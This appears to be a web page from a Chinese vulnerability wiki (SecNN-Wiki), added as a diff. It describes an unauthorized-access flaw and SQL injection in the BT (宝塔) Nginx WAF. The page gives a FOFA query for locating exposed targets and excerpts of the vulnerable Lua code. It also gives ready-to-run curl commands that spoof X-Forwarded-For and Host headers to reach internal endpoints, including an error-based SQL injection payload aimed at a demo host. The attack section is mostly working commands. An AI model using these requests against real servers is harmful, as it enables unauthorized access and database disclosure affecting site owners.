@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%9D%E5%A1%94/%E5%AE%9D%E5%A1%94%E6%9C%80%E6%96%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%8F%8Asql%E6%B3%A8%E5%85%A5/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>宝塔最新未授权访问漏洞及sql注入 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u5b9d\u5854\u6700\u65b0\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u53casql\u6ce8\u5165", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "\u672a\u6388\u6743", url: "#_1", children: [
+              {title: "\u63a5\u53e3", url: "#_2" },
+          ]},
+          {title: "sql\u6ce8\u5165", url: "#sql_1", children: [
+          ]},
+          {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_3", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%AF%8C%E9%80%9A%E5%A4%A9%E4%B8%8B%E5%A4%96%E8%B4%B8ERP/%E5%AF%8C%E9%80%9A%E5%A4%A9%E4%B8%8B%E5%A4%96%E8%B4%B8ERPUploadEmailAttr%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%AF%8C%E9%80%9A%E5%A4%A9%E4%B8%8B%E5%A4%96%E8%B4%B8ERP/%E5%AF%8C%E9%80%9A%E5%A4%A9%E4%B8%8B%E5%A4%96%E8%B4%B8ERPUploadEmailAttr%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        富通天下外贸ERP UploadEmailAttr存在任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E5%AE%9D%E5%A1%94%E4%BA%91WAFserver_name%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E5%AE%9D%E5%A1%94%E4%BA%91WAFserver_name%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        宝塔云WAF server_name存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="sql">宝塔最新未授权访问漏洞及sql注入<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h2>
+<p>WAF 防火墙 (宝塔 Nginx 防火墙) 存在 SQL 注入漏洞和未授权漏洞</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>title==&#39;404 - Website not exist!&#39;
+
+&quot;宝塔&quot;
+</code></pre></div>
+<h2 id="_1">未授权<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>漏洞代码
+<div class="highlight"><pre><span></span><code>start = function ()
+ ... 此处身略若干行
+ if ngx.var.remote_addr == &quot;127.0.0.1&quot; and ngx.ctx.Server_name == &quot;127.0.0.251&quot; and ngx.var.host == &quot;127.0.0.251&quot; then
+  if ngx.var.uri == &quot;/get_btwaf_drop_ip&quot; then
+   Public.return_message(200, uv0.get_btwaf_drop_ip())
+  elseif ngx.var.uri == &quot;/remove_btwaf_drop_ip&quot; then
+   Public.return_message(200, uv0.remove_btwaf_drop_ip())
+  elseif ngx.var.uri == &quot;/clean_btwaf_drop_ip&quot; then
+   Public.return_message(200, uv0.clean_btwaf_drop_ip())
+  elseif ngx.var.uri == &quot;/updateinfo&quot; then
+   Public.return_message(200, uv0.updateInfo())
+  elseif ngx.var.uri == &quot;/get_site_status&quot; then
+   Public.return_message(200, uv0.get_site_status())
+  elseif ngx.var.uri == &quot;/get_global_status&quot; then
+   Public.return_message(200, uv0.get_global_status())
+  end
+
+  if ngx.var.uri == &quot;/clean_btwaf_logs&quot; then
+   Public.return_message(200, uv0.clean_btwaf_logs())
+  end
+
+  if ngx.var.uri == &quot;/clear_speed_hit&quot; then
+   Public.return_message(200, uv0.clear_speed_hit())
+  end
+
+  if ngx.var.uri == &quot;/clear_replace_hit&quot; then
+   Public.return_message(200, uv0.clear_replace_hit())
+  end
+
+  if ngx.var.uri == &quot;/reset_customize_cc&quot; then
+   Public.return_message(200, uv0.reset_customize_cc())
+  end
+
+  if ngx.var.uri == &quot;/clear_speed_countsize&quot; then
+   Public.return_message(200, uv0.clear_speed_countsize())
+  end
+ end
+end
+</code></pre></div></p>
+<h3 id="_2">接口<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>curl &#39;http://宝塔地址/API&#39;  -H &#39;X-Forwarded-For: 127.0.0.1&#39; -H &#39;Host: 127.0.0.251&#39;
+
+curl &#39;http://btwaf-demo.bt.cn/get_site_status?server_name=bt.cn&#39;  -H &#39;X-Forwarded-For: 127.0.0.1&#39; -H &#39;Host: 127.0.0.251&#39;
+</code></pre></div>
+<h2 id="sql_1">sql注入<a class="headerlink" href="#sql_1" title="Permanent link">&para;</a></h2>
+<p><div class="highlight"><pre><span></span><code>curl &quot;http://btwaf-demo.bt.cn/get_site_status?server_name=&#39;-extractvalue(1,concat(0x5c,database()))-&#39;&quot;  -H &#39;X-Forwarded-For: 127.0.0.1&#39; -H &#39;Host: 127.0.0.251&#39;
+</code></pre></div>
+<img alt="image" src="https://github.com/wy876/POC/assets/139549762/bbd89fb6-b9b7-4628-a33d-57fc7b8708e5" /></p>
+<h2 id="_3">漏洞来源<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/7AqKcCS9puZgb9lG2KcAsg">https://mp.weixin.qq.com/s/7AqKcCS9puZgb9lG2KcAsg</a></li>
+<li><a href="https://www.v2ex.com/t/1015932">https://www.v2ex.com/t/1015932</a></li>
+</ul>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%AF%8C%E9%80%9A%E5%A4%A9%E4%B8%8B%E5%A4%96%E8%B4%B8ERP/%E5%AF%8C%E9%80%9A%E5%A4%A9%E4%B8%8B%E5%A4%96%E8%B4%B8ERPUploadEmailAttr%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%AF%8C%E9%80%9A%E5%A4%A9%E4%B8%8B%E5%A4%96%E8%B4%B8ERP/%E5%AF%8C%E9%80%9A%E5%A4%A9%E4%B8%8B%E5%A4%96%E8%B4%B8ERPUploadEmailAttr%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        富通天下外贸ERP UploadEmailAttr存在任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E5%AE%9D%E5%A1%94%E4%BA%91WAFserver_name%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E5%AE%9D%E5%A1%94%E4%BA%91WAFserver_name%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        宝塔云WAF server_name存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
